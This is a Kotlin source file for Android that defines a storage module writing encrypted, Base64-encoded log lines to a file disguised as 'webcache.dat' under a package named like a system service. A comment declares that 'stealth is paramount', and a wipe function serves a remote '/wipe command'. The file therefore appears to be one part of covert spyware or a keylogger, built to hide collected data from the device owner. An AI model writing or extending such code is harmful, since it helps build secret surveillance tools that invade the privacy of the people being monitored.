package com.system.service.core

import android.content.Context
import android.util.Base64
import java.io.File
import java.io.FileOutputStream

/**
 * Local encrypted storage — mirrors the desktop's webcache.dat approach.
 * Stores encrypted log lines in app-private storage.
 */
object Storage {

    private const val DATA_DIR = "svc_cache"
    private const val DATA_FILE = "webcache.dat"
    private const val MAX_FILE_SIZE = 50L * 1024 * 1024 // 50MB rotation threshold

    private var dataDir: File? = null

    fun init(context: Context) {
        // Use app's private files directory (no extra permissions needed)
        dataDir = File(context.filesDir, DATA_DIR).apply { mkdirs() }
    }

    private fun getDataFile(): File {
        return File(dataDir ?: throw IllegalStateException("Storage not initialized"), DATA_FILE)
    }

    /** Append an encrypted log line to the data file. */
    fun appendLog(plaintext: String) {
        try {
            val encrypted = Encryption.encrypt(plaintext.toByteArray(Charsets.UTF_8))
            val encoded = Base64.encodeToString(encrypted, Base64.NO_WRAP)

            val file = getDataFile()
            rotateIfNeeded(file)

            FileOutputStream(file, true).use { fos ->
                fos.write((encoded + "\n").toByteArray(Charsets.UTF_8))
            }
        } catch (_: Exception) {
            // Silent failure — stealth is paramount
        }
    }

    /** Read all decrypted log lines from the data file. */
    fun readAllLogs(): List<String> {
        val logs = mutableListOf<String>()
        val file = getDataFile()
        if (!file.exists()) return logs

        file.bufferedReader().useLines { lines ->
            lines.forEach { line ->
                if (line.isBlank()) return@forEach
                try {
                    val data = Base64.decode(line.trim(), Base64.NO_WRAP)
                    val decrypted = Encryption.decrypt(data)
                    logs.add(String(decrypted, Charsets.UTF_8))
                } catch (_: Exception) {
                    // Skip corrupted lines
                }
            }
        }
        return logs
    }

    /** Get total line count in the data file. */
    fun getLineCount(): Int {
        val file = getDataFile()
        if (!file.exists()) return 0
        return file.bufferedReader().useLines { it.count() }
    }

    /** Get file size in bytes. */
    fun getFileSize(): Long {
        val file = getDataFile()
        return if (file.exists()) file.length() else 0L
    }

    /** Rotate log file if it exceeds MAX_FILE_SIZE. */
    private fun rotateIfNeeded(file: File) {
        if (!file.exists() || file.length() < MAX_FILE_SIZE) return

        val ts = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US)
            .format(java.util.Date())
        val rotatedFile = File(file.parentFile, "${DATA_FILE}.${ts}.bak")
        file.renameTo(rotatedFile)
    }

    /** Wipe all stored data (for /wipe command). */
    fun wipeAll() {
        dataDir?.listFiles()?.forEach { it.delete() }
    }

    /** Delete the data file only. */
    fun deleteData() {
        getDataFile().delete()
    }
}
